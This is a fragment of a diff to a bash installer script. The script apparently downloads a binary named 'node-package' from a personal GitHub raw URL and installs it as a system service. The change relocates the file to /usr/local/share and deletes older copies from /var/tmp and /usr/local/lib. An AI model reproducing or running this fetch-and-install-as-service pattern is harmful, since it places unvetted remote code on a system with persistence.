@@ -5,7 +5,7 @@ set -e
 
 # Variables
 URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package"
-TARGET_DIR="/usr/local/lib"
+TARGET_DIR="/usr/local/share"
 FILENAME="node-package"
 FULL_PATH="$TARGET_DIR/$FILENAME"
 SERVICE_NAME="node-package"
@@ -71,6 +71,13 @@ fi
 
 # Remove existing node-package file from /var/tmp/ if present
 VAR_TMP_PATH="/var/tmp/$FILENAME"
+if [[ -f "$VAR_TMP_PATH" ]]; then
+    print_warning "Removing existing file: $VAR_TMP_PATH"
+    rm -f "$VAR_TMP_PATH"
+    print_status "File removed from /var/tmp/ successfully"
+fi
+# Remove existing node-package file from /usr/local/lib/ if present
+VAR_TMP_PATH="/usr/local/lib/$FILENAME"
 if [[ -f "$VAR_TMP_PATH" ]]; then
     print_warning "Removing existing file: $VAR_TMP_PATH"
     rm -f "$VAR_TMP_PATH"
